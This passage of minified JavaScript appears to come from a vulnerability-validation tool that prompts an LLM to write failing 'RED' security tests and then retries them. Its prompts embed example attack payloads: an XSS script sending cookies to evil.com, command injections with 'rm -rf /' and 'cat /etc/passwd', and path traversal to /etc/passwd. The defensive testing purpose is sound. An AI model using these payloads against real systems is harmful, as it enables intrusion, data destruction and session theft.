returned no code");Z.push({candidateIndex:F,error:"TestPassedUnexpectedly",errorMessage:"Test passed  you checked if the attack succeeds (it does). Inversion attempted but failed.",testOutput:N,generatedCode:A.testCode.slice(0,1500)});continue}let w=await this.classifyTestResult(O.exitCode,O.output,O.stderr);if(!w.isValidFailure){V.warn(` Candidate ${F+1}: ${w.type}  ${w.reason}`),this.lastFailureClassificationType=w.type,this.lastFailureIsInfrastructure=w.isInfrastructureFailure??fU({type:w.type,isValidFailure:!1,reason:""});let N=(O.stderr||O.output||"").split(`
`).filter((C)=>/error|cannot|not found|load|missing|undefined/i.test(C)).slice(0,5).join(`
`);Z.push({candidateIndex:F,error:w.type,errorMessage:`${w.reason}${N?": "+N:""}`,generatedCode:A.testCode.slice(0,1500)});continue}if(V.info(` Candidate ${F+1}: Genuine assertion failure: ${w.reason}`),O.existingTestsFailed){V.warn(` Candidate ${F+1}: Existing tests failed (regression)`),Z.push({candidateIndex:F,error:"ExistingTestsRegression",errorMessage:`Existing tests failed: ${O.failedTests?.join(", ")}`,generatedCode:A.testCode.slice(0,1500)});continue}if(this.registryClient){let N=X.cweId||X.cwe_id,C=W?.name,_=await this.registryClient.classifyTest(A.testCode,N,C);if(_?.is_static&&_?.static_acceptable!==!0){V.warn(` Candidate ${F+1}: STATIC test rejected (${_.reason})`),Z.push({candidateIndex:F,error:"StaticTestNotAcceptable",errorMessage:`Static source analysis  not acceptable for ${N||"unknown CWE"}`,generatedCode:A.testCode.slice(0,1500),retryGuidance:_.retry_guidance||void 0});continue}if(_)A._classificationResult=_}V.info(` Candidate ${F+1}: SUCCESS  genuine assertion failure, vulnerability proven`),M={...$,redTests:[A]};break}catch(O){V.error(` Candidate ${F+1}: Execution error:`,O),Z.push({candidateIndex:F,error:"TestExecutionError",errorMessage:O instanceof Error?O.message:String(O),generatedCode:A.testCode.slice(0,1500)});continue}}if(q(),M)return V.info(` Test generation successful on attempt ${H}`),this.lastRetryCount=H,M;let L=Z.find((F)=>F.error==="StaticTestNotAcceptable"),R=Z.find((F)=>F.error==="TestPassedUnexpectedly"),j=L||R||Z[Z.length-1];if(j)V.warn(`All ${z.length} candidates failed. Best attempt: ${j.error}`),Y.push({attempt:H,error:j.error,errorMessage:j.errorMessage,generatedCode:j.generatedCode,testOutput:j.testOutput,retryGuidance:j.retryGuidance,timestamp:new Date().toISOString()})}catch($){V.error(`Error during test generation attempt ${H}:`,$),Y.push({attempt:H,error:"GenerationError",errorMessage:$ instanceof Error?$.message:String($),timestamp:new Date().toISOString()})}}return V.warn(`Failed to generate valid test after ${J} attempts`),await this.tagIssueNotValidated(X,Y),null}async generateTestWithLLM(X,Q,J,Y,W){let G=await this.buildLLMPrompt(X,Q,J,Y,W),$=await(await k6(this.config.aiProvider)).complete(G,{temperature:0.2,maxTokens:this.config.aiProvider.maxTokens,model:this.config.aiProvider.model,thinking:{type:"enabled",budget_tokens:1e4}}),z=this.parseTestResponse($,X,Y);if(z.length===0)throw Error("LLM failed to generate test suite");return{framework:Y.name,testFile:Q.path,redTests:z}}getLanguageForFramework(X){return{jest:"javascript",vitest:"javascript",mocha:"javascript",rspec:"ruby",minitest:"ruby",pytest:"python",phpunit:"php",junit:"java",junit5:"java",junit4:"java",exunit:"elixir",testing:"go"}[X.name]||X.name}cleanExtractedCode(X){let Q=X;return Q=Q.replace(/^\s*\*\*[^*]+\*\*:?\s*$/gm,""),Q=Q.replace(/^\s*\*[^*]+\*:?\s*$/gm,""),Q=Q.replace(/^#{1,6}\s+.*$/gm,""),Q=Q.replace(/^-\s+(?=[A-Z])/gm,""),Q=Q.replace(/^```\w*\s*$/gm,""),Q=Q.replace(/^```\s*$/gm,""),Q=Q.replace(/^\s*(?:Approach|Method|Option|Solution|Step)\s*\d*:?\s*$/gim,""),Q=Q.replace(/\n{3,}/g,`

`),Q.trim()}parseTestResponse(X,Q,J){let Y=/```(?:javascript|typescript|ruby|python|php|elixir|java|js|ts|rb|py|ex|exs)?\s*\n([\s\S]*?)```/g,W=[],G;while((G=Y.exec(X))!==null){let z=G[1]?.trim();if(z&&z.length>0){let U=this.cleanExtractedCode(z);if(U.length>0)W.push(U)}}if(W.length>1)return W.map((z,U)=>({testName:`security_${Q.type}_approach_${U+1}`,testCode:z,attackVector:Q.attackVector,expectedBehavior:"should_fail_on_vulnerable_code"}));let H=W[0]||X.trim();if(!H)return[];try{let z=JSON.parse(H);if(Array.isArray(z.redTests))return z.redTests;if(Array.isArray(z.red))return z.red;if(z.testCode)return[z]}catch{}let $=H.split(/\n(?=(?:describe|it|test)\s*\()/);if($.length>1){let z=$[0].trim();if(z.length>0&&!/\b(?:describe|it|test)\s*\(/.test(z)){let K=$[0],B=$.slice(1).filter((q)=>q.trim().length>0);return B.map((q,Z)=>({testName:B.length===1?`security_${Q.type}_test`:`security_${Q.type}_test_${Z+1}`,testCode:(K+`
`+q).trim(),attackVector:Q.attackVector,expectedBehavior:"should_fail_on_vulnerable_code"}))}return $.filter((K)=>K.trim().length>0).map((K,B)=>({testName:`security_${Q.type}_test_${B+1}`,testCode:K.trim(),attackVector:Q.attackVector,expectedBehavior:"should_fail_on_vulnerable_code"}))}return[{testName:`security_${Q.type}_test`,testCode:H,attackVector:Q.attackVector,expectedBehavior:"should_fail_on_vulnerable_code"}]}async buildLLMPrompt(X,Q,J,Y,W){let G=this.getRealisticVulnerabilityExample(X.type),H=await this.getAssertionTemplateSection(X,Y),$=`Generate a RED test for a security vulnerability.

VULNERABILITY: ${X.description}
TYPE: ${X.type}
LOCATION: ${X.location}
ATTACK VECTOR: ${X.attackVector}
${X.vulnerablePattern?`VULNERABLE PATTERN: ${X.vulnerablePattern}`:""}
${X.source?`SOURCE: ${X.source}
VULNERABLE SOURCE FILE: ${X.source}`:""}
${W?`
ENVIRONMENT CONTEXT:
${W}
`:""}
${G}
${H}
TARGET TEST FILE: ${Q.path}
FRAMEWORK: ${Y.name}
${this.getAvailableLibrariesSection(Y)}
${this.getAssertionStyleSection(Y)}
TARGET FILE CONTENT (for context):
\`\`\`
${Q.content}
\`\`\`

UNDERSTANDING RED TESTS:
A "RED" test is a test that FAILS on the current vulnerable code. The failure proves the vulnerability exists.
The key insight: assert what SECURE code would do, so the assertion FAILS when run against INSECURE code.

## TEST APPROACH  BEHAVIORAL FIRST

Your test MUST exercise the vulnerable code at runtime, not just scan source files.

PREFERRED (Tier 1  Direct function call):
Import the vulnerable module, mock/stub side effects (database, HTTP, exec), call the function with
attacker-controlled input, and assert that the dangerous behavior occurs.

ACCEPTABLE (Tier 2  HTTP test client):
Use the framework's test client to send HTTP requests with attack payloads to the vulnerable endpoint.
Assert the response shows the vulnerability was triggered.

LAST RESORT (Tier 3  Source analysis):
Read the source file and check for the vulnerable pattern via regex. Only use this if importing the module
fails due to complex initialization (database connections, missing config, etc.).
If using Tier 3, add a comment: "// Source analysis fallback  could not import module because: <reason>"

DO NOT default to reading source files with fs.readFileSync/File.read/open(). That is a linter, not a proof
of exploitability. Import the actual code and exercise it.

CRITICAL: Test the APPLICATION'S business logic, not the language or framework.
DO NOT call language stdlib functions directly (Random.rand, Math.random, hashlib.md5, etc.) to demonstrate
they are insecure. Of course they are  that's well-known. Instead, import the APPLICATION MODULE and call
ITS function to prove that THE APP uses the insecure primitive. The test must fail because of what the app
does, not because of how the language works. If you fix the app, the test must be able to pass.

BAD: Random.srand(42); assert Random.rand == Random.rand   tests Ruby stdlib, not the app
GOOD: require_relative 'ext/failure_rate'; assert FailureRate.decide(request) uses SecureRandom   tests the app

BAD EXAMPLE  DO NOT generate tests like this:
\`\`\`javascript
//  REJECTED: This is a LINTER, not a test. It proves nothing about runtime behavior.
const source = fs.readFileSync('vulnerable-file.js', 'utf8');
assert(source.includes('parameterized'));  // Just checks text in source code
\`\`\`
Tests that ONLY read source files and run regex/string matching will be DEPRIORITIZED in candidate selection.
They do NOT prove exploitability. A static source scan cannot demonstrate that malicious input actually reaches
a dangerous sink at runtime. Generate BEHAVIORAL tests that import and call the vulnerable code instead.

Example RED test for SQL injection  BEHAVIORAL (Tier 1):
\`\`\`javascript
const assert = require('assert');
const { mock } = require('node:test');
const path = require('path');

// Mock the database to capture the SQL query
const capturedQueries = [];
mock.method(require('pg').Pool.prototype, 'query', (sql) => {
  capturedQueries.push(sql);
  return Promise.resolve({ rows: [] });
});

describe('SQL Injection Prevention', function() {
  it('should not pass unsanitized input to SQL query', async function() {
    const handler = require(path.join(process.cwd(), 'routes/users.js'));
    const maliciousInput = "' OR '1'='1";
    // Call the vulnerable function with attacker-controlled input
    await handler.searchUsers({ query: maliciousInput });
    // Assert: the malicious payload should NOT appear literally in the query
    const lastQuery = capturedQueries[capturedQueries.length - 1];
    assert.ok(!lastQuery.includes(maliciousInput),
      'SQL injection: user input appears unescaped in query');
  });
});
\`\`\`
This test FAILS because the vulnerable code interpolates user input directly into the SQL string.

Example RED test for Command Injection  BEHAVIORAL (Tier 1):
\`\`\`javascript
const assert = require('assert');
const { mock } = require('node:test');
const cp = require('child_process');
const path = require('path');

const executedCommands = [];
mock.method(cp, 'exec', (cmd) => { executedCommands.push(cmd); });

describe('Command Injection Prevention', function() {
  it('should not pass unsanitized input to exec()', function() {
    const handler = require(path.join(process.cwd(), 'core/appHandler.js'));
    handler.ping({ body: { address: '127.0.0.1; cat /etc/passwd' } }, { render: () => {} });
    const lastCmd = executedCommands[executedCommands.length - 1];
    // RED: exec() receives the semicolon injection  proves command injection
    assert.ok(!lastCmd.includes('; cat /etc/passwd'),
      'Command injection: unsanitized input reaches exec()');
  });
});
\`\`\`
This test FAILS because the vulnerable code passes user input directly to exec().

NOTE: The examples above use Node's built-in assert and node:test mock. If other assertion libraries are listed in AVAILABLE TEST LIBRARIES, you may use them instead. Adapt the import/mock patterns to your framework (sinon, unittest.mock, Mox, Mockery, Mockito, etc.).

YOUR TASK:
Generate 3 DIFFERENT test approaches. Each approach MUST be in its own separate code block.

OUTPUT FORMAT (IMPORTANT):
Return ONLY valid ${this.getLanguageForFramework(Y)} code inside each code block.
DO NOT include markdown formatting, headers, labels, or prose INSIDE the code blocks.
Code blocks must contain ONLY executable code  no "Approach 1:" labels, no bullet points, no explanations.

Place any explanations OUTSIDE and BEFORE the code blocks, like this:

Approach 1  BEHAVIORAL (required): Import the vulnerable module, mock dangerous operations, call with malicious input:
\`\`\`${this.getLanguageForFramework(Y)}
// Actual test code here  no markdown, no labels
\`\`\`

Approach 2  BEHAVIORAL (required): Different behavioral strategy (different mock target or HTTP test client):
\`\`\`${this.getLanguageForFramework(Y)}
// Actual test code here  no markdown, no labels
\`\`\`

Approach 3  BEHAVIORAL (strongly preferred) or source analysis ONLY if all behavioral approaches are truly impossible:
\`\`\`${this.getLanguageForFramework(Y)}
// Actual test code here  no markdown, no labels
\`\`\`

CRITICAL: Each code block must be a COMPLETE, STANDALONE test file with valid syntax.
DO NOT include text like "**Approach 1:**" or "### Pattern Matching" inside the code blocks  that causes syntax errors.

Each test should:
1. Use the attack vector: ${X.attackVector}
2. FAIL on vulnerable code (assert what secure code would do  since the code is insecure, the assertion fails)
3. PASS after fix is applied (once the code is fixed, the assertion passes)
4. Be completely standalone (no require of rails_helper, spec_helper, or app-specific helpers)
5. Follow ${Y.name} conventions

APPROACH STRATEGIES (behavioral first  DO NOT default to reading source files):
- Approach 1: BEHAVIORAL  import/require the vulnerable module, mock side effects (DB, exec, HTTP), call the function with attack payload, assert dangerous behavior occurs
- Approach 2: BEHAVIORAL  use a different mock strategy or test a different code path that exercises the same vulnerability
- Approach 3: SOURCE ANALYSIS FALLBACK  if importing fails, read source file and check for vulnerable patterns (only if Approaches 1-2 are truly impossible)
${X.source?`6. IMPORT the actual source file  do NOT inline/copy vulnerable code into the test.
   The test runs with process.cwd() set to the repository root.

   PREFERRED (Tier 1  behavioral): require/import the module and call its functions with attack input:
   const target = require(path.join(process.cwd(), '${X.source}'));
   Mock external dependencies (database, child_process, HTTP) to capture dangerous behavior.
   Then call the vulnerable function with attacker-controlled input and assert.

   If require() triggers side effects (DB connections, HTTP servers), mock those side effects BEFORE requiring:
   const { mock } = require('node:test');
   mock.method(require('pg').Pool.prototype, 'query', () => Promise.resolve({ rows: [] }));
   const target = require(path.join(process.cwd(), '${X.source}'));

   FALLBACK (Tier 3  source analysis): Only if importing truly fails after trying mocks:
   const sourceCode = fs.readFileSync(path.join(process.cwd(), '${X.source}'), 'utf8');
   Add comment: // Source analysis fallback  could not import because: <specific reason>
${(()=>{let z=X.source||"",U=/config|settings|env|\.config\./i.test(z),K=/routes?|controllers?|middleware|handlers?/i.test(z),B=/models?|dao|data|schema/i.test(z);if(U)return`
   HINT: '${z}' appears to be a CONFIG file  require() should work directly without mocking.`;else if(K||B)return`
   HINT: '${z}' appears to be a route/model file  mock database/HTTP BEFORE requiring, then call the exported handler with attack input.`;return""})()}
   IMPORTANT: Always use path.join(process.cwd(), '<relative-path>')  never use relative require paths like '../'.`:"6. Is SELF-CONTAINED  inline the vulnerable pattern directly in the test."}`;if(J.length>0){$+=`

PREVIOUS ATTEMPTS (learn from these errors):`;for(let K of J)$+=`
- Attempt ${K.attempt}: ${K.error} - ${K.errorMessage}`;let z=J[J.length-1];if(z.generatedCode)$+=`

YOUR PREVIOUS TEST CODE (attempt ${z.attempt}):
\`\`\`
${z.generatedCode}
\`\`\``;if(z.testOutput)$+=`

TEST OUTPUT FROM PREVIOUS ATTEMPT:
\`\`\`
${z.testOutput}
\`\`\``;let U=z.error;if(U==="StaticTestNotAcceptable")V.info(`[RFC-103] Building retry feedback for StaticTestNotAcceptable (attempt ${z.attempt})`),$+=o5(z,X,this.availableTestLibraries);else if(U==="SyntaxError")V.info(`[RFC-103] Building retry feedback for SyntaxError (attempt ${z.attempt})`),$+=o5(z,X,this.availableTestLibraries);else if(U==="TestPassedUnexpectedly")V.info(`[RFC-103] Building retry feedback for TestPassedUnexpectedly (attempt ${z.attempt}, type: ${X.type||"unknown"})`),$+=o5(z,X,this.availableTestLibraries),$+=`

CONCRETE INVERSION EXAMPLES:

WRONG (passes on vulnerable code):
`+`  expect(query).to.include(userInput);  // Attack succeeds  user input is in query
`+`RIGHT (fails on vulnerable code):
`+`  expect(query).to.match(/\\$[0-9]|\\?/); // Security check  parameterized placeholders exist (they don't)

`+`WRONG (passes on vulnerable code):
`+`  expect(output).to.include(maliciousScript);  // Attack succeeds  XSS payload rendered
`+`RIGHT (fails on vulnerable code):
`+`  expect(source).to.match(/escapeHtml|sanitize/); // Security check  sanitization exists (it doesn't)

`+`WRONG (passes on vulnerable code):
`+`  expect(hash).to.equal(md5(password));  // Attack succeeds  weak hash used
`+`RIGHT (fails on vulnerable code):
`+`  expect(source).to.match(/bcrypt|argon2|scrypt/); // Security check  strong hash exists (it doesn't)

`+"THE PATTERN: expect(code_or_behavior).to.have(security_property_that_is_missing)";else if(U==="ExistingTestsRegression")$+=`

IMPORTANT: Don't break existing tests. Avoid modifying shared state or setup blocks.`;else if(U==="TestExecutionError"&&z.errorMessage?.includes("MODULE_NOT_FOUND"))V.info(`[RFC-103] Building retry feedback for MODULE_NOT_FOUND error (attempt ${z.attempt})`),$+=o5(z,X,this.availableTestLibraries),$+=`
Also use path.join(process.cwd(), '${X.source}') to reference the source file. Do NOT use relative paths like require('../...'). process.cwd() is always the repository root.`;else if(["runtime_error","missing_dependency","syntax_error"].includes(U)){let K=z.errorMessage||"";if(K.includes("Module-level assertions"))$+=`

## CRITICAL ERROR: YOUR ASSERTIONS RAN OUTSIDE it() BLOCKS
Your test had assertions that executed at module load time, before mocha could discover any tests.
This happens when you put logic INSIDE describe() but OUTSIDE it().

`+`**WRONG** (assertions in describe scope  runs at load time):
`+`\`\`\`
describe('Test', function() {
  const source = fs.readFileSync(file, 'utf8');
  const hasVuln = /pattern/.test(source);
  assert.strictEqual(hasVuln, false, 'Vulnerability found'); // RUNS AT LOAD TIME!
  it('should detect vulnerability', function() { }); // EMPTY!
});
\`\`\`

**CORRECT** (ALL logic inside it() callback):
\`\`\`
describe('Hardcoded Credentials', function() {
  it('should detect hardcoded secrets in config', function() {
    const source = fs.readFileSync(filePath, 'utf8');
    const hasHardcoded = /['"]\\w{20,}['"]/.test(source);
    assert.strictEqual(hasHardcoded, false, 'Hardcoded credential found');
  });
});
\`\`\`

`+"PUT EVERYTHING  file reads, regex checks, AND assertions  INSIDE the it() function body.";else if(K.includes("No tests found"))$+=`

PREVIOUS ATTEMPT FAILED: The test file contained no test cases. Ensure the file has describe()/it() blocks (for mocha) or test() blocks. ALL logic (file reads, variable assignments, assertions) MUST be inside the it() callback, not at module scope or describe scope.`;else if(K.includes("cannot load such file")||K.includes("LoadError"))$+=`

PREVIOUS ATTEMPT FAILED: ${K}. DO NOT require rails_helper, spec_helper, or application-specific helpers. Write a STANDALONE test that only requires rspec and the vulnerable source file directly. Use require_relative or explicit paths. The test must run without Rails booting.`;else if(K.includes("Cannot find module")||K.includes("No module named"))V.info(`[RFC-103] Building retry feedback for missing dependency (attempt ${z.attempt}): ${K.slice(0,100)}`),$+=o5(z,X,this.availableTestLibraries);else $+=`

PREVIOUS ATTEMPT FAILED: ${U}  ${K}. Fix the error and ensure tests can run to completion.`}}return $}async getAssertionTemplateSection(X,Q){let J=X.cweId||X.cwe_id||this.extractCweFromType(X.type);if(!J)return V.debug(`[RFC-103] No CWE ID found for vulnerability type: ${X.type||"unknown"}`),"";let Y=Q.name.toLowerCase();if(this.registryClient){let G=await this.registryClient.getEntry(J,Y);if(G?.assertion_template)return V.info(`[RFC-104] Using platform registry entry for ${J} (${G.name}) with framework: ${Q.name}`),this.formatPlatformTemplateSection(G,J,Q,Y,X)}let W=$P(J,Y);if(!W)return V.debug(`[RFC-103] No assertion template found for CWE: ${J}, framework: ${Q.name}`),"";return V.info(`[RFC-103] Using local assertion template for ${J} (${W.name}) with framework: ${Q.name}`),`
## ASSERTION STRATEGY FOR ${W.name} (${J})
Goal: ${W.assertionGoal}
Attack payload to use: ${W.attackPayload}
Strategy: ${W.testStrategy}

**CRITICAL: Test Structure Requirement**
Your test MUST use proper ${Q.name} test structure with describe() and it() blocks.
All assertions MUST be inside it() callbacks, NOT at module load time.
Tests that run assertions outside it() blocks will be rejected.

Framework hint (${Q.name}): ${W.frameworkHint}

`}formatPlatformTemplateSection(X,Q,J,Y,W){let G=X.assertion_template,H=D7.getFewShotExample(X,Y),$=X.framework_hint||G.framework_hints[Y]||G.framework_hints.mocha||"",z=`
## ASSERTION STRATEGY FOR ${X.name} (${Q})
`;if(H){let U=this.getLanguageForFramework(J);if(z+=`
### EXAMPLE TEST  Adapt to this project:
\`\`\`${U}
${H.trim()}
\`\`\`

INSTRUCTIONS: Adapt the above example to this project:`,W?.source)z+=`
- The vulnerable file is: ${W.source}
- Import the vulnerable module: require(path.join(process.cwd(), '${W.source}')) or equivalent for your language`;if(W?.vulnerablePattern)z+=`
- The vulnerable code pattern is:
\`\`\`
${W.vulnerablePattern.slice(0,500)}
\`\`\`
- Mock the dangerous operation visible in the pattern above`;z+=`
- Change mock targets to match the actual library used in the project
- Keep the same assertion pattern (mock  call  capture  assert)
- DO NOT copy the example verbatim  adapt it to the specific vulnerable code

`}return z+=`Goal: ${G.assertion_goal}
Attack payload to use: ${G.attack_payload}
Strategy: ${G.test_strategy}

**CRITICAL: Test Structure Requirement**
Your test MUST use proper ${J.name} test structure with describe() and it() blocks.
All assertions MUST be inside it() callbacks, NOT at module load time.
Tests that run assertions outside it() blocks will be rejected.

Framework hint (${J.name}): ${$}

`,z}isBackendErrorContent(X){let Q=[/Failed to format test/i,/manual integration required/i,/Error formatting test/i,/Integration error/i,/Failed to parse/i],J=X.trim();if(J.length<200)return Q.some((Y)=>Y.test(J));if(/^\/\/\s*(Failed|Error|Integration)/i.test(J))return!0;return!1}extractCweFromType(X){let Q={sql_injection:"CWE-89","sql injection":"CWE-89",xss:"CWE-79","cross-site scripting":"CWE-79",cross_site_scripting:"CWE-79",path_traversal:"CWE-22","path traversal":"CWE-22",directory_traversal:"CWE-22",file_inclusion:"CWE-22",command_injection:"CWE-78","command injection":"CWE-78",os_command_injection:"CWE-78",rce:"CWE-78",deserialization:"CWE-502",insecure_deserialization:"CWE-502",hardcoded_credentials:"CWE-798",hardcoded_secrets:"CWE-798","hardcoded credentials":"CWE-798",hardcoded_secret:"CWE-798",code_injection:"CWE-94","code injection":"CWE-94",eval_injection:"CWE-94",prototype_pollution:"CWE-1321","prototype pollution":"CWE-1321",template_injection:"CWE-1336","template injection":"CWE-1336",insecure_jwt:"CWE-347",debug_mode:"CWE-215",weak_crypto:"CWE-327",weak_cryptography:"CWE-327",cryptographic_failure:"CWE-327",broken_access_control:"CWE-284",broken_authentication:"CWE-287",security_misconfiguration:"CWE-16",ssrf:"CWE-918",open_redirect:"CWE-601",nosql_injection:"CWE-943",xxe:"CWE-611",csrf:"CWE-352",log_injection:"CWE-117",information_disclosure:"CWE-200",sensitive_data_exposure:"CWE-200"},J=X.toLowerCase().trim();return Q[J]}getAvailableLibrariesSection(X){let J=["vitest","pytest","phpunit","rspec","exunit"].includes(X.name),Y=[...this.availableTestLibraries];if(J&&!Y.includes(X.name))Y.push(X.name);if(Y.length===0)return"";let W=`
AVAILABLE TEST LIBRARIES: ${Y.join(", ")}
IMPORTANT: Only use assertion libraries from the list above. DO NOT use libraries like 'chai' or 'expect' if they are not listed.
`;if(X.name==="vitest")W+=`
VITEST IMPORT SYNTAX (CRITICAL - vitest requires ES modules):
Use ES module imports: import { describe, it, expect } from 'vitest';
DO NOT use require() syntax with vitest - it will fail.
`;else if(J)W+=`
NOTE: ${X.name} is available as a bundled test runner in the execution environment.
`;else if(!J)W+=`
If no assertion library is available, use Node's built-in 'assert' module (const assert = require('assert');).
`;return W}getAssertionStyleSection(X){let Q=this.getEcosystemFromFramework(X),J=["vitest","pytest","phpunit","rspec","exunit"],Y=[...this.availableTestLibraries];if(J.includes(X.name)&&!Y.includes(X.name))Y.push(X.name),V.info(`[RFC-103] Adding bundled runner '${X.name}' to available libraries for assertion guidance`);let W=KP(Q,Y);V.info(`[RFC-103] Assertion style guidance: ${W.style} style with ${W.preferredLibrary}`);let G=`
## ASSERTION STYLE GUIDANCE
Style: ${W.style} (${W.preferredLibrary})
Import: ${W.importStatement||"No import needed - globals are auto-available"}
Example syntax:
${W.syntaxExample}
`;if(W.doNotUse.length>0)G+=`
DO NOT USE these libraries (not installed): ${W.doNotUse.slice(0,5).join(", ")}${W.doNotUse.length>5?"...":""}
`;if(W.versionWarning)G+=`
WARNING: ${W.versionWarning}
`;return G}getEcosystemFromFramework(X){let J={jest:"javascript",vitest:"javascript",mocha:"javascript",jasmine:"javascript",tap:"javascript",ava:"javascript",bun:"javascript",pytest:"python",unittest:"python",rspec:"ruby",minitest:"ruby",exunit:"elixir",phpunit:"php",pest:"php",junit:"java",testng:"java",go_test:"go",testing:"go"}[X.name.toLowerCase()];if(J)return J;if(this.projectEcosystems.length>0)return this.projectEcosystems[0];return"javascript"}getRealisticVulnerabilityExample(X){return{sql_injection:`REAL-WORLD EXAMPLE (RailsGoat):
Pattern: User.where("id = '#{params[:user][:id]}'")
Attack: 5') OR admin = 't' --'
Impact: Privilege escalation to admin
CWE: CWE-89`,nosql_injection:`REAL-WORLD EXAMPLE (NodeGoat):
Pattern: db.accounts.find({username: username, password: password})
Attack: {"username": "admin", "password": {"$gt": ""}}
Impact: Authentication bypass
CWE: CWE-943`,xss:`REAL-WORLD EXAMPLE (NodeGoat):
Pattern: res.send(\`<h1>Profile: \${user.name}</h1>\`)
Attack: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
Impact: Session hijacking
CWE: CWE-79`,command_injection:`REAL-WORLD EXAMPLE:
Pattern: exec(\`tar -czf backup.tar.gz \${filename}\`)
Attack: data.txt; rm -rf / #
Impact: System compromise
CWE: CWE-78`,path_traversal:`REAL-WORLD EXAMPLE:
Pattern: res.sendFile(\`/app/uploads/\${filename}\`)
Attack: ../../../etc/passwd
Impact: Read sensitive files
CWE: CWE-22`,code_injection:`REAL-WORLD EXAMPLE (NodeGoat):
Pattern: const preTax = eval(req.body.preTax);
Attack: require('child_process').execSync('cat /etc/passwd')
Impact: Remote code execution via eval() of user input
CWE: CWE-94`,hardcoded_secrets:`REAL-WORLD EXAMPLE:
Pattern: zapApiKey: "v9dn0balpqas1pcc281tn5ood1"
Attack: Searching source code or git history for API keys
Impact: Unauthorized API access
CWE: CWE-798`}[X.toLowerCase()]||`Vulnerability type: ${X}`}async invertPassingTest(X,Q,J,Y){let W=Y.name==="rspec"?"ruby":["mocha","jest","vitest"].includes(Y.name)?"javascript":Y.name,G=`Your test PASSED but it needs to FAIL on vulnerable code.

HERE IS YOUR TEST THAT PASSED:
\`\`\`${W}
${X}
\`\`\`

TEST OUTPUT (showing it PASSED):
\`\`\`
${Q.slice(-800)}
\`\`\`

THE PROBLEM:
Your test checks if the ATTACK SUCCEEDS  and it does, so the test passes.
But we need a RED test that FAILS on vulnerable code.

YOUR TASK:
INVERT the assertion. Instead of checking if the attack works, check if SECURITY CONTROLS EXIST.
Since the code is vulnerable (no security controls), this inverted assertion will FAIL.

INVERSION EXAMPLES:

Original (PASSES on vulnerable code):
  expect(query).to.include(userInput);  // Attack succeeds
Inverted (FAILS on vulnerable code):
  expect(source).to.match(/\\$[0-9]|\\?/);  // Checks for parameterized placeholders  they don't exist

Original (PASSES on vulnerable code):
  expect(output).to.include('<script>');  // XSS payload rendered
Inverted (FAILS on vulnerable code):
  expect(source).to.match(/escapeHtml|sanitize/);  // Checks for sanitization  it doesn't exist

Original (PASSES on vulnerable code):
  expect(hash).to.equal(md5(password));  // Weak hash used
Inverted (FAILS on vulnerable code):
  expect(source).to.match(/bcrypt|argon2|scrypt/);  // Checks for strong hash  it doesn't exist

THE PATTERN:
- Your test checks: "Does the attack work?"  YES  PASS
- Inverted test checks: "Does the security control exist?"  NO  FAIL

VULNERABILITY CONTEXT:
Type: ${J.type}
Location: ${J.location}

Return ONLY the inverted test file. No explanation, just the code block:

\`\`\`${W}
// Your inverted test here
\`\`\``;try{V.info("[Two-Phase] Attempting inversion of passing test...");let z=(await(await k6(this.config.aiProvider)).complete(G,{temperature:0.2,maxTokens:this.config.aiProvider.maxTokens,model:this.config.aiProvider.model,thinking:{type:"enabled",budget_tokens:8000}})).match(/```(?:javascript|typescript|ruby|python|js|ts|rb|py|rspec)?\s*\n([\s\S]*?)```/);if(z&&z[1]?.trim())return V.info("[Two-Phase] Successfully generated inverted test"),z[1].trim();return V.warn("[Two-Phase] Failed to extract code block from inversion response"),null}catch(H){return V.error("[Two-Phase] Inversion call failed:",H),null}}frameworkFromName(X){return{mocha:{name:"mocha",testCommand:"npx mocha",syntaxCheckCommand:"node --check"},jest:{name:"jest",testCommand:"npx jest",syntaxCheckCommand:"node --check"},vitest:{name:"vitest",testCommand:"npx vitest run",syntaxCheckCommand:"node --check"},rspec:{name:"rspec",testCommand:"bundle exec rspec",syntaxCheckCommand:"ruby -c"},pytest:{name:"pytest",testCommand:"python3 -m pytest",syntaxCheckCommand:"python3 -m py_compile"},phpunit:{name:"phpunit",testCommand:"vendor/bin/phpunit",syntaxCheckCommand:"php -l"},exunit:{name:"exunit",testCommand:"mix test",syntaxCheckCommand:""},minitest:{name:"minitest",testCommand:"ruby -Itest",syntaxCheckCommand:"ruby -c"},junit:{name:"junit",testCommand:"./gradlew test --tests ",syntaxCheckCommand:""},junit4:{name:"junit4",testCommand:"./gradlew test --tests ",syntaxCheckCommand:""},junit5:{name:"junit5",testCommand:"mvn test -Dtest=",syntaxCheckCommand:""},testng:{name:"testng",testCommand:"mvn test -Dtest=",syntaxCheckCommand:""},cypress:{name:"cypress",testCommand:"npx cypress run --spec",syntaxCheckCommand:"node --check"},playwright:{name:"playwright",testCommand:"npx playwright test",syntaxCheckCommand:"node --check"}}[X.toLowerCase()]||this.detectFrameworkFromPath(X)}detectFrameworkFromPath(X){let Q=W0.basename(X),J=W0.extname(X);if(Q.includes(".spec.")){if(J===".rb")return{name:"rspec",syntaxCheckCommand:"ruby -c",testCommand:"bundle exec rspec"};if(J===".ts"||J===".js")return{name:"jest",syntaxCheckCommand:"node --check",testCommand:"npm test"}}if(Q.includes(".test.")){if(J===".ts"||J===".js")return{name:"vitest",syntaxCheckCommand:"node --check",testCommand:"npm test"};if(J===".php")return{name:"phpunit",syntaxCheckCommand:"php -l",testCommand:"vendor/bin/phpunit"}}if(J===".py")return{name:"pytest",syntaxCheckCommand:"python3 -m py_compile",testCommand:"python3 -m pytest"};if(J===".rb")return{name:"rspec",syntaxCheckCommand:"ruby -c",testCommand:"bundle exec rspec"};if(J===".java")return{name:"junit5",syntaxCheckCommand:"",testCommand:"mvn test"};if(J===".ex"||J===".exs")return{name:"exunit",syntaxCheckCommand:"",testCommand:"mix test"};return{name:"generic",syntaxCheckCommand:'echo "No syntax check"',testCommand:'echo "No test 